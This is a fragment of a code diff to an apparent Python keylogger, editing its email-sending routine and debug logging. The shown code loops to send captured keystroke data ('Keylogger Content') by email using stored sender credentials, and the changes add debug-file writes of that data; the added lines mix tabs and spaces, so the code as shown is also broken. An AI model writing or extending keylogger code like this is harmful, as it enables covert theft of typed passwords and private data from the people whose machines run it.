@@ -35,8 +35,12 @@ if not path.isfile(dir):
     
 def send_mail():
     global data
+	
+	file_object = open(debugFile, "a+")
+    file_object.write("INPUT: " + DEBUG_INPUT)
+    file_object.close()
+	
     while True:
-        DEBUG_MODE = DEBUG_INPUT
         write_to_debug_file("===== SENDING EMAIL: DEBUG MODE =====\n" + "Data Content Length: " + str(len(data)) + "\n" + "Keylogger Content: " + data + "\n" + "Email: " + EEMAIL + "\n" + "Password: " + EPASS + "\n" + "[*] SENDING EMAIL NOW" + "\n")
         if len(data) > 0:
             timeInSecs = datetime.datetime.now()
@@ -73,7 +77,7 @@ def send_mail():
 
 
 def write_to_debug_file(string_to_write):
-    if(DEBUG_MODE == 'y'):
+    if(DEBUG_INPUT == 'y'):
         file_object = open(debugFile, "a+")
         file_object.write(string_to_write)
         file_object.close()
